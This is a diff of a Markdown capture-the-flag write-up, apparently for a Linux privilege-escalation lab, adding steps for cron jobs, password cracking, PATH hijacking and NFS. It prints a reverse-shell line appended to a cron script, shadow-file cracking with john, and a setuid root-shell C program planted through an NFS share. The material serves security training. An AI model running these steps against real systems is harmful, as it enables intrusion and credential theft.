@@ -12,7 +12,7 @@
 hostname
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What is the Linux kernel version of the target system?**
 
@@ -78,7 +78,7 @@ chmod +x exploit
 whoami
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation: Sudo
 
@@ -152,7 +152,7 @@ base64 /etc/shadow | base64 --decode
 base64 /etc/passwd | base64 --decode
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -204,28 +204,144 @@ getcap -r / 2>/dev/null
 
 
 
+**Victim**
+
 ```
 find / -name "flag4.txt" 2>/dev/null
 cat /home/ubuntu/flag4.txt
 ```
 
+## Privilege Escalation: Cron Jobs
 
+**How many user-defined cron jobs can you see on the target system?**
 
+**Victim**
 
+```
+cat /etc/crontab
+```
 
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
 
+```
+ls -lah /home/karen/backup.sh
+cat /home/karen/backup.sh
+```
 
+<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
+**Kali**
 
+```
+nc -lvnp 4444
+```
 
+**Victim**
 
+```
+chmod +x /home/karen/backup.sh
+echo "bash -i >& /dev/tcp/10.10.19.80/4444 0>&1" >> /home/karen/backup.sh
+```
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+**What is Matt's password?**
 
+Cat files and copy over to Kali.
 
+**Victim**
 
+```
+cat /etc/passwd
+cat /etc/shadow
+```
 
+**Kali**
 
+```
+unshadow passwd shadow > passwords.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+```
 
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation: PATH
+
+**What is the odd folder you have write access for?**
+
+**Victim**
+
+```
+find / -writable 2>/dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+
+**Exploit the $PATH vulnerability to read the content of the flag6.txt file**
+
+<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+
+****
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+cd /home/murdoch
+export PATH=/home/murdoch:$PATH
+echo "/bin/bash" > thm
+chmod 777 thm
+./test
+```
+
+## Privilege Escalation: NFS
+
+**Victim**
+
+```
+showmount -e 10.10.216.254
+cat /etc/exports
+```
+
+<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+mkdir /root/attack
+mount -o rw 10.10.216.254:/home/ubuntu/sharedfolder /root/attack
+subl /root/attack/nfc.c
+```
+
+**nfc.c**
+
+```
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+
+**Kali**
+
+```
+gcc /root/attack/nfc.c -o /root/attack/nfc -w
+chmod +s /root/attack/nfc
+```
+
+**Victim**
+
+```
+cd /home/ubuntu/sharedfolder
+./nfc
+```
+
+<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
